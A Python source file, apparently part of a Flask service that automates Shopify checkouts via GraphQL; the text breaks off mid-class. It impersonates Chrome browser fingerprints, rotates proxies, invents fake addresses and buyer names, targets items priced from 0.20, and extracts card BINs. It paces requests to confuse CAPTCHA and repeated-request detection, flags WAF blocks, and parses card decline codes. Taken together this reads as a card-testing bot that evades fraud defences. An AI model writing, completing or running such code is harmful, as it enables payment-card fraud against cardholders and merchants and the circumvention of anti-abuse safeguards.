import asyncio
import json
import math
import os
import random
import re
import secrets
import string
import sys
import time
import traceback
import threading
import uuid
from urllib.parse import urlparse

from curl_cffi.requests import AsyncSession
from flask import Flask, request

# ═══════════════════════════════════════════════════════════════════════
# Tier 3 raw queries
# ═══════════════════════════════════════════════════════════════════════
try:
    from query import (
        QUERY_PROPOSAL_SHIPPING,
        QUERY_PROPOSAL_DELIVERY,
        MUTATION_SUBMIT,
        QUERY_POLL,
    )
    _RAW_QUERIES_AVAILABLE = True
except Exception:
    QUERY_PROPOSAL_SHIPPING = QUERY_PROPOSAL_DELIVERY = MUTATION_SUBMIT = QUERY_POLL = None
    _RAW_QUERIES_AVAILABLE = False


_RAW_QUERIES = {
    "Proposal":             QUERY_PROPOSAL_DELIVERY,
    "SubmitForCompletion":  MUTATION_SUBMIT,
    "PollForReceipt":       QUERY_POLL,
}

RAW_SUBMIT_MUTATION = """
mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){
  submitForCompletion(input:$input attemptToken:$attemptToken){
    __typename
    ...on SubmitSuccess{receipt{...R}}
    ...on SubmitAlreadyAccepted{receipt{...R}}
    ...on SubmitFailed{reason __typename}
    ...on SubmitRejected{errors{code localizedMessage}__typename}
    ...on Throttled{pollAfter __typename}
    ...on SubmittedForCompletion{receipt{...R}}
  }
}
fragment R on Receipt{
  __typename
  ...on ProcessedReceipt{id redirectUrl orderStatusPageUrl __typename}
  ...on ProcessingReceipt{id pollDelay __typename}
  ...on WaitingReceipt{id pollDelay __typename}
  ...on FailedReceipt{id processingError{...on PaymentFailed{code __typename}}__typename}
}
"""

RAW_POLL_QUERY = """
query PollForReceipt($receiptId:ID!){
  receipt(receiptId:$receiptId){
    __typename
    ...on ProcessedReceipt{purchaseOrder{totalAmountToPay{amount currencyCode}} __typename}
    ...on ProcessingReceipt{pollDelay __typename}
    ...on WaitingReceipt{pollDelay __typename}
    ...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated __typename}}__typename}
  }
}
"""
try:
    if sys.platform != "win32":
        import uvloop
        uvloop.install()
except ImportError:
    pass

_real_print = print
def print(*args, **kwargs):
    ts = time.strftime('%H:%M:%S', time.localtime())
    ms = int((time.time() % 1) * 1000)
    _real_print(f"[{ts}.{ms:03d}]", *args, **kwargs)

PERSISTED_ID_PROPOSAL = "4489553d637c1a549275a233bde4401525073ddcd821e5ef8ba5f3cb7eb981e4"
PERSISTED_ID_SUBMIT   = "87897af28ba65a3b993d7270e6acecafc49f1c0bf0419623a09fa673d3a256c1"
PERSISTED_ID_POLL     = "15a4bd77000454cb9d3d2bf92ca657ef3889f0e1448cdb2414be07ee2c83081b"
PCI_BUILD_ID          = "09497de"


class _LRUCache:
    def __init__(self, maxsize):
        self._d, self._order, self._max = {}, [], maxsize
        self._lock = threading.Lock()
    def __getitem__(self, k):
        with self._lock: return self._d[k]
    def __setitem__(self, k, v):
        with self._lock:
            if k not in self._d:
                if len(self._order) >= self._max:
                    old = self._order.pop(0); self._d.pop(old, None)
                self._order.append(k)
            self._d[k] = v
    def __contains__(self, k):
        with self._lock: return k in self._d
    def get(self, k, default=None):
        with self._lock: return self._d.get(k, default)
    def items(self):
        with self._lock: return list(self._d.items())


_ID_CACHE = _LRUCache(maxsize=50)


def _current_id_for(op_name):
    return {
        "Proposal": PERSISTED_ID_PROPOSAL,
        "SubmitForCompletion": PERSISTED_ID_SUBMIT,
        "PollForReceipt": PERSISTED_ID_POLL,
    }.get(op_name)


def _set_persisted_id(op_name, new_id):
    global PERSISTED_ID_PROPOSAL, PERSISTED_ID_SUBMIT, PERSISTED_ID_POLL
    if op_name == "Proposal":              PERSISTED_ID_PROPOSAL = new_id
    elif op_name == "SubmitForCompletion": PERSISTED_ID_SUBMIT = new_id
    elif op_name == "PollForReceipt":      PERSISTED_ID_POLL = new_id


def _is_persisted_stale(text):
    if not text: return False
    return ("PersistedQueryNotFound" in text
            or "PERSISTED_QUERY_NOT_FOUND" in text)


# ═══════════════════════════════════════════════════════════════════════
# Tunables
# ═══════════════════════════════════════════════════════════════════════
MIN_PRICE          = 0.20
SESSION_TIMEOUT    = 25
VAULT_TIMEOUT      = 12
RECEIPT_POLL_MAX   = 5
RECEIPT_POLL_DELAY = 1.0
P2_TOTAL_POLL_MAX  = 3
P2_TOTAL_POLL_DELAY = 1.0

GQL_RETRY_ATTEMPTS = 1

# ── NEW: anti-CAPTCHA pacing (repeated-request detector ko confuse karta hai)
GQL_GAP_MIN        = 0.6
GQL_GAP_MAX        = 1.4
SUBMIT_FRESH_WINDOW = 45  # seconds; > this → queueToken refresh


# ═══════════════════════════════════════════════════════════════════════
# Currency ↔ country + addresses
# ═══════════════════════════════════════════════════════════════════════
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK",
    "GBP": "GB", "CHF": "CH", "THB": "TH", "JPY": "JP", "KRW": "KR",
    "SGD": "SG", "CNY": "CN", "AUD": "AU", "NZD": "NZ", "BRL": "BR",
    "MXN": "MX", "EUR": "DE",
}

SHOPIFY_PAYMENTS_COUNTRIES = {
    "US", "CA", "GB", "IE", "AU", "NZ",
    "DE", "FR", "ES", "IT", "NL", "BE", "AT", "CH", "DK", "SE", "NO",
    "PT", "FI", "CZ", "RO", "PL",
    "SG", "HK", "JP", "MY",
    "BR", "MX", "AE", "PR",
}

_US_STREETS = [
    "Broadway Ave", "Maple Drive", "Oak Street", "Pine Ave", "Elm Street",
    "Cedar Lane", "Walnut Drive", "Cherry Street", "Birch Ave", "Spruce Rd",
    "Park Place", "Lake View Dr", "Highland Ave", "Sunset Blvd", "River Road",
    "Willow Way", "Aspen Court", "Magnolia St", "Juniper Lane", "Cypress Blvd",
]

_US_CITIES = [
    ("Chicago", "60613", "IL", "312"),
    ("Houston", "77002", "TX", "713"),
    ("Phoenix", "85001", "AZ", "602"),
    ("Philadelphia", "19103", "PA", "215"),
    ("San Diego", "92101", "CA", "619"),
    ("Dallas", "75201", "TX", "214"),
    ("Jacksonville", "32099", "FL", "904"),
    ("Seattle", "98101", "WA", "206"),
    ("Denver", "80201", "CO", "720"),
    ("Atlanta", "30301", "GA", "404"),
    ("Boston", "02101", "MA", "617"),
    ("Portland", "97201", "OR", "503"),
    ("Nashville", "37201", "TN", "615"),
    ("Louisville", "40201", "KY", "502"),
    ("Memphis", "38101", "TN", "901"),
]


def _gen_us_addr():
    city, zipc, state, area = random.choice(_US_CITIES)
    num = random.randint(100, 9999)
    street = f"{num} {random.choice(_US_STREETS)}"
    tail = random.randint(1000, 9999)
    return {
        "address1": street, "city": city, "postalCode": zipc,
        "zoneCode": state, "phone": f"{area}555{tail}",
        "countryCode": "US",
    }


book = {
    "CA": [{"address1": "88 Queen Street", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "phone": "4165550198"}],
    "GB": [{"address1": "221B Baker Street", "city": "London", "postalCode": "NW16XE", "zoneCode": "ENG", "phone": "2079460123"}],
    "IN": [{"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "phone": "9876543210"}],
    "AE": [{"address1": "Burj Khalifa Tower", "city": "Dubai", "postalCode": "00000", "zoneCode": "DU", "phone": "045551234"}],
    "HK": [{"address1": "1 Nathan Road", "city": "Kowloon", "postalCode": "999077", "zoneCode": "KLN", "phone": "27361234"}],
    "CH": [{"address1": "Gotthardstrasse 17", "city": "Zurich", "postalCode": "8001", "zoneCode": "ZH", "phone": "445512345"}],
    "TH": [{"address1": "123 Sukhumvit Road", "city": "Bangkok", "postalCode": "10110", "zoneCode": "BK", "phone": "812345678"}],
    "JP": [{"address1": "1-1 Shibuya", "city": "Tokyo", "postalCode": "1500002", "zoneCode": "TK", "phone": "9012345678"}],
    "KR": [{"address1": "123 Gangnam-daero", "city": "Seoul", "postalCode": "06236", "zoneCode": "SL", "phone": "1012345678"}],
    "SG": [{"address1": "1 Raffles Place", "city": "Singapore", "postalCode": "048616", "zoneCode": "SG", "phone": "65551234"}],
    "CN": [{"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "phone": "1062512345"}],
    "AU": [{"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "phone": "291234567"}],
    "NZ": [{"address1": "157 Lambton Quay", "city": "Wellington", "postalCode": "6011", "zoneCode": "WGN", "phone": "44990010"}],
    "BR": [{"address1": "Av Paulista 1000", "city": "Sao Paulo", "postalCode": "01310100", "zoneCode": "SP", "phone": "11987654321"}],
    "MX": [{"address1": "Av Reforma 100", "city": "Ciudad de Mexico", "postalCode": "06600", "zoneCode": "CMX", "phone": "5512345678"}],
    "DE": [{"address1": "Unter den Linden 1", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "phone": "3022310000"}],
    "FR": [{"address1": "1 Rue de Rivoli", "city": "Paris", "postalCode": "75001", "zoneCode": "IDF", "phone": "140205000"}],
    "IT": [{"address1": "Via del Corso 1", "city": "Rome", "postalCode": "00186", "zoneCode": "RM", "phone": "0639967700"}],
    "ES": [{"address1": "Gran Via 1", "city": "Madrid", "postalCode": "28013", "zoneCode": "MD", "phone": "915231234"}],
    "NL": [{"address1": "Herengracht 1", "city": "Amsterdam", "postalCode": "1015BA", "zoneCode": "NH", "phone": "205551234"}],
}


# ── FIX #1: Chrome 136 profiles (JA4 / TLS extension order match)
BROWSER_PROFILES = [
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
     "impersonate": "chrome136",
     "sec_ch_ua": '"Brave";v="136", "Not_A Brand";v="24", "Chromium";v="136"',
     "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
     "impersonate": "chrome136",
     "sec_ch_ua": '"Chromium";v="136", "Not_A Brand";v="24", "Google Chrome";v="136"',
     "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
     "impersonate": "chrome136",
     "sec_ch_ua": '"Chromium";v="136", "Not_A Brand";v="24", "Google Chrome";v="136"',
     "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
     "impersonate": "chrome136",
     "sec_ch_ua": '"Chromium";v="136", "Not_A Brand";v="24", "Google Chrome";v="136"',
     "platform": '"Linux"', "mobile": "?0"},
]


def parse_proxy(proxy_str):
    if not proxy_str: return None
    proxy_str = proxy_str.strip()
    if not proxy_str: return None

    KNOWN_SCHEMES = ('http', 'https', 'socks4', 'socks4a', 'socks5', 'socks5h')

    lower = proxy_str.lower()
    if '://' in lower:
        scheme = lower.split('://', 1)[0]
        if scheme in KNOWN_SCHEMES:
            return proxy_str
        proxy_str = proxy_str.split('://', 1)[1]

    if '@' in proxy_str:
        creds, hostpart = proxy_str.split('@', 1)
        user, _, pwd = creds.partition(':')
        hp_parts = hostpart.split(':')
        scheme = 'http'
        if len(hp_parts) >= 3 and hp_parts[-1].lower() in KNOWN_SCHEMES:
            scheme = hp_parts[-1].lower()
            hostpart = ':'.join(hp_parts[:-1])
        if pwd:
            return f"{scheme}://{user}:{pwd}@{hostpart}"
        return f"{scheme}://{user}@{hostpart}"

    parts = proxy_str.split(':')

    if len(parts) >= 2 and parts[0].lower() in KNOWN_SCHEMES:
        scheme = parts[0].lower()
        r = parts[1:]
        if len(r) == 4: return f"{scheme}://{r[2]}:{r[3]}@{r[0]}:{r[1]}"
        if len(r) > 4:  return f"{scheme}://{r[2]}:{':'.join(r[3:])}@{r[0]}:{r[1]}"
        if len(r) == 2: return f"{scheme}://{r[0]}:{r[1]}"
        if len(r) == 1: return f"{scheme}://{r[0]}"

    if len(parts) >= 5 and parts[-1].lower() in KNOWN_SCHEMES:
        scheme = parts[-1].lower()
        host, port = parts[0], parts[1]
        user = parts[2]
        pwd = ':'.join(parts[3:-1])
        return f"{scheme}://{user}:{pwd}@{host}:{port}"

    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    if len(parts) == 3:
        host, port, user = parts
        return f"http://{user}@{host}:{port}"
    if len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    if len(parts) > 4:
        host, port, user = parts[0], parts[1], parts[2]
        pwd = ':'.join(parts[3:])
        return f"http://{user}:{pwd}@{host}:{port}"
    return f"http://{proxy_str}"


# ═══════════════════════════════════════════════════════════════════════
# Header builders
# ═══════════════════════════════════════════════════════════════════════
def build_headers(profile, ourl, for_document=False, sec_fetch_site=None, with_user=True):
    ua = profile["ua"]
    sec_ch_ua = profile["sec_ch_ua"]
    platform = profile["platform"]
    mobile = profile["mobile"]
    accept_lang = "en-US,en;q=0.9"

    if for_document:
        site = sec_fetch_site or "none"
        h = {
            "accept": ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                       "image/avif,image/webp,image/apng,*/*;q=0.8,"
                       "application/signed-exchange;v=b3;q=0.7"),
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": accept_lang,
            "priority": "u=0, i",
            "sec-ch-ua": sec_ch_ua,
            "sec-ch-ua-mobile": mobile,
            "sec-ch-ua-platform": platform,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": site,
            "upgrade-insecure-requests": "1",
            "user-agent": ua,
        }
        if with_user:
            h["sec-fetch-user"] = "?1"
        return h

    return {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": accept_lang,
        "content-type": "application/json",
        "origin": ourl,
        "priority": "u=1, i",
        "referer": ourl + "/",
        "sec-ch-ua": sec_ch_ua,
        "sec-ch-ua-mobile": mobile,
        "sec-ch-ua-platform": platform,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": ua,
    }

def _checkout_headers(profile, ourl, checkout_url):
    h = build_headers(profile, ourl, for_document=True, sec_fetch_site="same-origin", with_user=True)
    h["referer"] = f"{ourl}/cart"
    h["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
    return h

def _probe_headers(profile, ourl):
    h = build_headers(profile, ourl, for_document=False)
    h["accept"] = "*/*"
    h.pop("content-type", None)
    h.pop("origin", None)
    return h


def _script_headers(profile, checkout_origin):
    return {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "priority": "u=1, i",
        "referer": f"https://{checkout_origin}/",
        "sec-ch-ua": profile["sec_ch_ua"],
        "sec-ch-ua-mobile": profile["mobile"],
        "sec-ch-ua-platform": profile["platform"],
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "no-cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "user-agent": profile["ua"],
    }


def _css_headers(profile, checkout_origin):
    h = _script_headers(profile, checkout_origin)
    h["accept"] = "text/css,*/*;q=0.1"
    h["sec-fetch-dest"] = "style"
    return h


def _gql_headers(profile, checkout_origin, source_id, sst, gql_referer,
                 build_id=None, ident_sig=None, session_identifier=None,
                 source_token=None, source_type="cn"):
    h = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": f"https://{checkout_origin}",
        "priority": "u=1, i",
        "referer": gql_referer,
        "sec-ch-ua": profile["sec_ch_ua"],
        "sec-ch-ua-mobile": profile["mobile"],
        "sec-ch-ua-platform": profile["platform"],
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{source_id}", type="cn"',
        "user-agent": profile["ua"],
        "x-checkout-one-session-token": sst,
    }
    if build_id:
        h["x-checkout-web-build-id"] = build_id
        h["x-checkout-web-deploy-stage"] = "production"
        h["x-checkout-web-server-handling"] = "fast"
        h["x-checkout-web-server-rendering"] = "yes"
    h["x-checkout-web-source-id"] = source_id
    if ident_sig:
        h["shopify-identification-signature"] = ident_sig
    if session_identifier:
        h["x-checkout-web-checkout-session-identifier"] = session_identifier
    return h


# ── FIX #4: jitter-based throttle wait (explicit fallback still respected)
def _throttle_wait(resp, fallback=None):
    if fallback is None:
        fallback = random.uniform(1.2, 2.5)
    if not resp: return fallback
    try:
        ra = resp.headers.get("Retry-After") or resp.headers.get("retry-after")
        if ra: return max(float(ra), 0.8)
    except (ValueError, TypeError, AttributeError):
        pass
    return fallback


# ── NEW: exponential backoff helper
def _backoff_wait(attempt, base=1.0, cap=8.0):
    return min(base * (2 ** attempt), cap) + random.uniform(0, 0.5)


# ── FIX #2: anti-repeated-request jitter between GraphQL stages
async def _gql_gap(min_s=GQL_GAP_MIN, max_s=GQL_GAP_MAX):
    await asyncio.sleep(random.uniform(min_s, max_s))


# ═══════════════════════════════════════════════════════════════════════
# WAF / captcha detection
# ═══════════════════════════════════════════════════════════════════════
def is_waf_block(text):
    if not text: return False
    lower = text.lower()
    if "<html" in lower or "<!doctype" in lower:
        return any(x in lower for x in (
            "__cf_chl", "challenge-platform", "cf-browser-verification",
            "checking your browser", "just a moment", "attention required",
        ))
    return any(x in lower for x in (
        '"ray_id"', '"ray id"',
        '"error code: 1020"', '"error code: 1015"',
        '"code":1020', '"code": 1020',
        '"code":1015', '"code": 1015',
        '"access denied"',
    ))


def is_captcha_required(text):
    if not text: return False
    if is_waf_block(text): return False
    try:
        parsed = json.loads(text)
    except (json.JSONDecodeError, TypeError, ValueError):
        return False
    for err in (parsed.get("errors") or []):
        if not isinstance(err, dict): continue
        code = ((err.get("extensions") or {}).get("code")
                or err.get("code", ""))
        if code in ("CAPTCHA_REQUIRED", "CHECKPOINT_REQUIRED"):
            return True
    try:
        result = (parsed.get("data", {}).get("session", {})
                        .get("negotiate", {}).get("result", {}) or {})
        seller = result.get("sellerProposal") or {}
        cap = seller.get("captcha") or {}
        if cap.get("__typename") == "Captcha":
            return True
    except (AttributeError, TypeError):
        pass
    return False


# ── FIX #6: differentiate CAPTCHA vs CHECKPOINT (solvable vs proxy issue)
def _captcha_signal(text):
    """Returns (captcha_type, solvable). captcha_type ∈
    {None, 'CAPTCHA_REQUIRED', 'CHECKPOINT_REQUIRED'}."""
    if not text or is_waf_block(text):
        return None, None
    try:
        parsed = json.loads(text)
    except (json.JSONDecodeError, TypeError, ValueError):
        return None, None

    for err in (parsed.get("errors") or []):
        if not isinstance(err, dict): continue
        code = ((err.get("extensions") or {}).get("code")
                or err.get("code", ""))
        if code == "CAPTCHA_REQUIRED":
            return "CAPTCHA_REQUIRED", False
        if code == "CHECKPOINT_REQUIRED":
            try:
                result = (parsed.get("data", {}).get("session", {})
                                .get("negotiate", {}).get("result", {}) or {})
                cp = result.get("checkpointData")
                return "CHECKPOINT_REQUIRED", bool(cp)
            except (AttributeError, TypeError):
                return "CHECKPOINT_REQUIRED", False

    try:
        result = (parsed.get("data", {}).get("session", {})
                        .get("negotiate", {}).get("result", {}) or {})
        seller = result.get("sellerProposal") or {}
        cap = seller.get("captcha") or {}
        if cap.get("__typename") == "Captcha":
            return "CAPTCHA_REQUIRED", False
    except (AttributeError, TypeError):
        pass
    return None, None


_WAF_SOFT_SIGNALS = (
    "hcaptcha", "h-captcha", "recaptcha", "g-recaptcha",
    "captcha_challenge", "captcha challenge",
    "__cf_chl", "cf-browser-verification", "challenge-platform",
    "checking your browser", "just a moment", "attention required",
)


def _log_aux_signals(where, text):
    if not text: return
    if is_waf_block(text):
        print(f"[waf:log] {where} — WAF block detected")
    lower = text.lower()
    found = [sig for sig in _WAF_SOFT_SIGNALS if sig in lower]
    if found:
        print(f"[captcha:log] {where} — soft signals={found}")


_CONNECTION_ERROR_PATTERNS = (
    "cannot connect", "failed to connect", "proxy", "connection refused",
    "connection reset", "connection error", "connection aborted",
    "tunnel connection", "proxy error", "proxyerror", "sslerror",
    "ssl error", "ssl:", "certificate", "handshake", "timed out",
    "timeout", "time out", "name resolution", "dns", "socket",
    "network is unreachable", "no route to host", "unreachable",
    "curl: (", "openssl", "getaddrinfo", "eof occurred",
)


def _looks_like_connection_error(text):
    if not text or not isinstance(text, str): return False
    t = text.lower()
    return any(p in t for p in _CONNECTION_ERROR_PATTERNS)


# ═══════════════════════════════════════════════════════════════════════
# URL normalizer
# ═══════════════════════════════════════════════════════════════════════
def normalize_and_extract(raw_url):
    if not raw_url:
        return None, None, None
    raw_url = raw_url.strip()
    if raw_url.startswith("ttps://"):
        raw_url = "https://" + raw_url[7:]
    elif raw_url.startswith("https:/") and not raw_url.startswith("https://"):
        raw_url = "https://" + raw_url[8:]
    if not raw_url.startswith(("http://", "https://")):
        raw_url = "https://" + raw_url
    p = urlparse(raw_url)
    if not p.netloc:
        return None, None, None
    origin = f"{p.scheme}://{p.netloc}"

    variant_hint = None
    if p.query:
        try:
            from urllib.parse import parse_qs
            q = parse_qs(p.query)
            for k in ("id", "variant", "variant_id"):
                if q.get(k):
                    v = (q[k][0] or "").strip()
                    if v.isdigit():
                        variant_hint = v
                        break
        except Exception:
            pass

    product_hint = None
    m = re.search(r"/products/([^/?#]+)", p.path or "")
    if m:
        product_hint = m.group(1)

    return origin, variant_hint, product_hint


# ═══════════════════════════════════════════════════════════════════════
# Parsing helpers
# ═══════════════════════════════════════════════════════════════════════
def extract_between(text, start, end):
    if not text or not start or not end: return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                r = parts[1].split(end, 1)[0]
                return r if r else None
        return None
    except Exception:
        return None


def extract_merch_stable_id(delivery_line):
    if not isinstance(delivery_line, dict): return None
    tm = delivery_line.get("targetMerchandise")
    if isinstance(tm, dict):
        for key in ("linesV2", "lines"):
            lines = tm.get(key)
            if isinstance(lines, list) and lines and isinstance(lines[0], dict):
                sid = lines[0].get("stableId")
                if sid: return sid
    tml = delivery_line.get("targetMerchandiseLines")
    if isinstance(tml, dict):
        lines = tml.get("lines")
        if isinstance(lines, list) and lines and isinstance(lines[0], dict):
            sid = lines[0].get("stableId")
            if sid: return sid
    return delivery_line.get("stableId")


def extract_selected_strategy_handle(dl):
    if not isinstance(dl, dict): return None
    sel = dl.get("selectedDeliveryStrategy")
    if isinstance(sel, dict) and sel.get("handle"): return sel["handle"]
    return None


def extract_available_strategy_handle(dl):
    if not isinstance(dl, dict): return None
    strategies = dl.get("availableDeliveryStrategies")
    if isinstance(strategies, list):
        for s in strategies:
            if isinstance(s, dict) and s.get("handle"): return s["handle"]
    return None


def resolve_delivery_strategy(dl):
    h = extract_selected_strategy_handle(dl)
    if h: return h, "selected"
    h = extract_available_strategy_handle(dl)
    if h: return h, "available"
    return None, None


def extract_requires_shipping(dl):
    if not isinstance(dl, dict): return None
    tm = dl.get("targetMerchandise")
    if isinstance(tm, dict):
        lines = tm.get("linesV2") or tm.get("lines") or []
        if lines and isinstance(lines[0], dict):
            merch = lines[0].get("merchandise") or {}
            if "requiresShipping" in merch:
                return bool(merch["requiresShipping"])
    return None


def extract_captcha_challenge(sp):
    if not isinstance(sp, dict): return None
    cap = sp.get("captcha") or {}
    tn = cap.get("__typename")
    if tn == "Captcha":
        return cap.get("provider"), cap.get("sitekey"), cap.get("token")
    if tn == "PendingTerms":
        return "PENDING", None, cap.get("taskId")
    return None


def _currency_for_country(iso):
    for cur, c in C2C.items():
        if c == iso: return cur
    return "USD"


def _positive_amount(val):
    if val is None: return None
    try:
        return str(val) if float(str(val)) > 0 else None
    except (TypeError, ValueError):
        return None


def _cc_digits(cc):
    return re.sub(r"\D", "", str(cc))


def _cc_bin(cc):
    digits = _cc_digits(cc)
    return digits[:8] if len(digits) >= 8 else None


def _gen_attempt_token(source_id):
    alphabet = string.ascii_lowercase + string.digits
    return f"{source_id}-{''.join(secrets.choice(alphabet) for _ in range(11))}"


def _gen_page_id():
    h = uuid.uuid4().hex
    return (f"{h[:8].lower()}-{h[8:12].upper()}-{h[12:16].upper()}"
            f"-{h[16:20].upper()}-{h[20:].upper()}")


def _payment_referer(checkout_url, source_id=None):
    if not checkout_url: return checkout_url
    if "/payment" in checkout_url: return checkout_url
    parts = checkout_url.split("?", 1)
    base = parts[0].rstrip("/")
    qs = "?" + parts[1] if len(parts) == 2 else ""
    m = re.match(r"^(.*?/checkouts/cn/[^/]+/[a-z]{2}-[a-z]{2})$", base)
    if m: return m.group(1) + "/payment" + qs
    m = re.match(r"^(.*?/checkouts/cn/[^/]+)$", base)
    if m: return m.group(1) + "/en-us/payment" + qs
    m = re.match(r"^(.*?/checkouts/[^/]+)$", base)
    if m: return m.group(1) + "/payment" + qs
    return checkout_url


def _billing_street_dict(street, address2, city, country_code, s_zip,
                         firstName, lastName, state, phone):
    return {
        "address1": street, "address2": address2 or "",
        "city": city, "countryCode": country_code, "postalCode": s_zip,
        "firstName": firstName, "lastName": lastName, "zoneCode": state,
        "phone": phone or "",
    }


def _payment_method_wrapper(direct_payment_method):
    return {
        "directPaymentMethod": direct_payment_method,
        "giftCardPaymentMethod": None, "ownedGiftCardPaymentMethod": None,
        "redeemablePaymentMethod": None, "walletPaymentMethod": None,
        "walletsPlatformPaymentMethod": None, "localPaymentMethod": None,
        "paymentOnDeliveryMethod": None, "paymentOnDeliveryMethod2": None,
        "manualPaymentMethod": None, "customPaymentMethod": None,
        "offsitePaymentMethod": None, "customOnsitePaymentMethod": None,
        "deferredPaymentMethod": None, "customerCreditCardPaymentMethod": None,
        "paypalBillingAgreementPaymentMethod": None, "remotePaymentInstrument": None,
    }


def _money(amount_str, currency):
    return {"value": {"amount": str(amount_str), "currencyCode": currency}}


def _delivery_target(stable_id):
    if stable_id:
        return {"lines": [{"stableId": stable_id}]}
    return {"any": True}


def _delivery_none_line(stable_id):
    return {
        "selectedDeliveryStrategy": {
            "deliveryStrategyMatchingConditions": {
                "estimatedTimeInTransit": {"any": True},
                "shipments": {"any": True}},
            "options": {}},
        "targetMerchandiseLines": _delivery_target(stable_id),
        "deliveryMethodTypes": ["NONE"],
        "expectedTotalPrice": {"any": True},
        "destinationChanged": True,
    }


def _delivery_shipping_line(stable_id, strategy_handle, billing_street):
    return {
        "destination": {"streetAddress": dict(billing_street)},
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {
                "handle": strategy_handle, "customDeliveryRate": False},
            "options": {}},
        "targetMerchandiseLines": _delivery_target(stable_id),
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {"any": True},
        "destinationChanged": True,
    }


def _initial_shipping_line(billing_street, stable_id):
    return {
        "destination": {"partialStreetAddress": {
            "address1": billing_street["address1"], "address2": billing_street["address2"],
            "city": billing_street["city"], "countryCode": billing_street["countryCode"],
            "postalCode": billing_street["postalCode"],
            "firstName": billing_street["firstName"], "lastName": billing_street["lastName"],
            "zoneCode": billing_street["zoneCode"], "phone": billing_street["phone"]}},
        "selectedDeliveryStrategy": {
            "deliveryStrategyMatchingConditions": {
                "estimatedTimeInTransit": {"any": True},
                "shipments": {"any": True}},
            "options": {}},
        "targetMerchandiseLines": _delivery_target(stable_id),
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {"any": True},
        "destinationChanged": True,
    }


def extract_clean_response(message):
    if not message: return "UNKNOWN_ERROR"
    message = str(message)
    BLOCK = {"skip_shop_pay", "auto_redirect", "edge_redirect",
             "locale", "true", "false", "null", "undefined"}
    if message.lower().strip() in BLOCK: return "UNKNOWN_ERROR"
    message = re.sub(r"<[^>]+>", "", message).strip()
    for pat in (r"(PAYMENTS_[A-Z_]+)", r"(CARD_[A-Z_]+)", r"(MERCHANDISE_[A-Z_]+)",
                r"(DELIVERY_[A-Z_]+)", r"(TOTAL_[A-Z_]+)", r"(TAX_[A-Z_]+)",
                r"([A-Z]+_[A-Z]+_[A-Z_]+)", r"([A-Z]+_[A-Z_]+)",
                r'\{"code":"([^"]+)"'):
        for m in re.findall(pat, message, re.IGNORECASE):
            if isinstance(m, tuple): m = m[0]
            if m and "_" in m and len(m) < 80:
                clean = m.strip("{}:'\" ")
                if clean.lower() not in BLOCK: return clean
    return message[:120]


def extract_real_error_from_text(text):
    if not text: return None
    try:
        parsed = json.loads(text)
        errs = parsed.get("errors")
        if errs:
            if isinstance(errs, str):
                return errs
            if isinstance(errs, list):
                first = errs[0] if errs else None
                if isinstance(first, dict):
                    code = (first.get("extensions", {}) or {}).get("code") or first.get("code", "")
                    msg = first.get("message", "")
                    if isinstance(msg, dict): msg = json.dumps(msg)
                    if code and msg: return f"{code}: {msg}"
                    if code: return code
                    if msg: return msg
                if first is not None and not isinstance(first, dict):
                    return str(first)
        submit_data = parsed.get("data", {}).get("submitForCompletion", {})
        if submit_data:
            rtype = submit_data.get("__typename", "")
            if rtype == "SubmitRejected":
                errs = submit_data.get("errors", [])
                if errs:
                    e = errs[0]
                    code = e.get("code", "")
                    msg = (e.get("localizedMessage")
                           or e.get("nonLocalizedMessage") or e.get("message", ""))
                    if isinstance(msg, dict): msg = json.dumps(msg)
                    if code and msg: return f"{code}: {msg}"
                    if code: return code
                    if msg: return msg
            if rtype == "SubmitFailed":
                reason = submit_data.get("reason", "")
                if reason: return str(reason)
    except Exception:
        pass
    return None


class Utils:
    @staticmethod
    def get_random_name():
        firsts = ["James","John","Robert","Michael","William","David",
                  "Mary","Patricia","Jennifer","Linda","Thomas","Charles"]
